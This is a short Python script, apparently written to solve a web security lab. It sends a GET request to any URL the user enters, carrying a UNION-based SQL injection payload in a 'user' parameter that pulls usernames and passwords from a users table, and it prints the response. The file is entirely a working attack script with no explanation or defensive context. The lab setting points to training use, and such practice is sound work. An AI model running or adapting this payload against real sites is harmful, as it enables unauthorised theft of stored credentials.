#This python script is created to solve lab using requests module
import requests
payload = { "user": "admin' UNION SELECT username, password, NULL FROM users--"}
print("Enter url:")
url = input()
get_response = requests.get(url, params=payload)
print ("SQL Injection");
print(get_response.content)
